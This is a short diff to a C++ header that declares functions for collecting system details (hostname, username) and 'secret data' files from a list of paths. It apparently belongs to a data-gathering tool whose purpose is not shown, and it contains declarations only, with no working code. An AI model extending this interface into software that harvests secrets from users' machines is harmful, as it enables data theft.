@@ -19,11 +19,11 @@ namespace scoutreg {
 
     struct SecretData {
         std::string            filename;
-        std::vector<std::byte> zip_bytes;
+        std::vector<std::byte> content;
     };
 
     std::optional<SystemInfo> collect_system_info();
-    std::optional<SecretData> collect_secret_data(const std::string& username);
+    std::vector<SecretData>  collect_secret_data(const std::vector<std::string>& paths);
 
     void load_hostname(SystemInfo&);
     void load_username(SystemInfo&);
